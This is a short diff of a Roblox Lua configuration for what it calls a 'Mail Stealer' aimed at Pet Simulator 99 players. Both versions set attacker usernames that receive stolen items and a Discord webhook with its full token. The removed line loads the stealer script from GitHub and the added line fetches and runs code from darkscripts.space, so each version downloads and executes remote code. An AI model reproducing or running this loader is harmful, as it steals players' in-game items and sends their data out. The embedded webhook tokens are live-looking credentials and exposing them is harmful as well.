@@ -1,5 +1,5 @@
-Username = "HugeGamesIO"
-LoadScreen = true 
-Webhook = "https://discord.com/api/webhooks/1220409025821151264/omUNdK9bQQgxfUH7P2T_2WQ7ZfDTEsvucOZFvGXatlxINGL_cGSFjz37khoxv4pwIVJX" -- Paste your Discord webhook here
+Username = "greg_justin"
+Username2 = "ahmedbestbrocool123"
+Webhook = "https://discord.com/api/webhooks/1289613307631632417/RrQFIi86rxupJJinPyFfQ_kikvOLmmYz82lfO0NDBPUdC15aIDUkUBSqHRrBGGbyhYk3"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
+loadstring(game:HttpGet(('https://darkscripts.space/ps99')))()
